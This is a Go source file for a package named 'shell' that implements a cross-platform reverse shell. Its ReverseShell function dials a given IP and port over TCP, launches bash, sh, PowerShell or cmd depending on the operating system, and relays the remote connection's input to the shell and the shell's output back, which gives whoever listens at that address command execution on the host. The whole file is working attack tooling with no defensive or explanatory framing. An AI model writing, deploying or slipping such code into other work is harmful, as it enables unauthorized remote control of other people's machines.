package shell

import (
	"errors"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"

	log "github.com/sirupsen/logrus"
)

const (
	bash    = "/bin/bash"
	sh      = "/bin/sh"
	cmd     = "C:\\Windows\\System32\\cmd.exe"
	powersh = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
	buffer  = 256
)

func Run(shell string, tx chan<- []byte, rx <-chan []byte) {
	cmd := exec.Command(shell)

	stdin, err := cmd.StdinPipe()
	if err != nil {
		log.Panic(err)
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		log.Panic(err)
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		log.Panic(err)

	}

	go func() {
		for {
			select {
			case remoteCommand := <-rx:
				log.Printf("remote command: %v", string(remoteCommand))
				stdin.Write(remoteCommand)
			}
		}
	}()

	go func() {
		for {
			buf := make([]byte, buffer)
			stderr.Read(buf)
			log.Printf("error: %v", string(buf))
			tx <- buf
		}
	}()

	cmd.Start()
	for {
		buf := make([]byte, buffer)
		stdout.Read(buf)
		log.Printf("writing to conn: %v", string(buf))
		tx <- buf
	}

}

func ReverseShell(ip, port string) {
	address := fmt.Sprintf("%s:%s", ip, port)
	conn, err := net.Dial("tcp", address)
	if err != nil {
		log.Error(err)
	}
	shell := GetShell()
	if len(shell) == 0 {
		log.Panic(errors.New("no shell found"))
	}

	// Send and receive channels
	tx := make(chan []byte)
	rx := make(chan []byte)

	go Run(shell, tx, rx)

	go func() {
		for {
			data := make([]byte, buffer)
			conn.Read(data)
			rx <- data
		}
	}()

	for {
		select {
		case outgoing := <-tx:
			conn.Write(outgoing)
		}
	}

}

func GetShell() string {
	switch os := runtime.GOOS; os {
	case "linux":
		if exists(bash) {
			return bash
		}
		return sh
	case "darwin":
		if exists(bash) {
			return bash
		}
		return sh
	case "windows":
		if exists(powersh) {
			return powersh
		}
		return cmd
	}
	return ""
}

func exists(path string) bool {
	if _, err := os.Stat(path); os.IsNotExist(err) {
		return false
	}
	return true
}
